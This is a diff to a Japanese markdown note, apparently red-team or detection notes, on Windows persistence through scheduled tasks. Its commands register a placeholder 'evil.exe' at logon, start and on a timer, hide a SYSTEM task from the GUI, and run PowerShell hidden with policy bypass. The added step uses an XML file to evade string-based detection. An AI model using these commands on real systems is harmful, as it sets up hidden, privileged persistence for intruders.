@@ -16,6 +16,8 @@ schtasks /create /tn "EveryHourRun" /tr "C:\Temp\evil.exe" /sc hourly /mo 1 /rl 
 schtasks /create /tn "EveryDayRun" /tr "C:\Temp\evil.exe" /sc daily /st 12:00 /rl highest
 # ログオン時実行の登録
 schtasks /create /tn "LogonRun" /tr "C:\Temp\evil.exe" /sc onlogon /rl highest
+# 検知時の親コマンドライン
+C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Schedule
 ```
 ## Step2 GUIから隠す
 タスクスケジューラのGUI(taskschd.msc)のデフォルト設定では見えないように登録する。
@@ -23,9 +25,13 @@ schtasks /create /tn "LogonRun" /tr "C:\Temp\evil.exe" /sc onlogon /rl highest
 # SYSTEM権限で、かつバックグラウンド設定(/itなし)で登録
 schtasks /create /tn "HiddenTask" /tr "C:\Windows\System32\calc.exe" /sc onlogon /ru "SYSTEM" /rl highest
 ```
-
 ## Step3 システム起動時の実行
 ユーザーがログインする前(Session 0)に、SYSTEM権限で実行する。
 ```powershell
 schtasks /create /tn "Step3" /tr "powershell.exe -c -ep bypass -nop -W hidden C:\Users\Public\step3.ps1" /sc onstart /ru "SYSTEM" /rl highest
+```
+## Step4 XMLファイルによる隠蔽
+`schtasks`の引数を直接打たずにXMLファイルから読み込ませて文字列検知を回避する。
+```powershell
+schtasks /create /xml "C:\Users\Public\step4.xml" /tn "Step4"
 ```
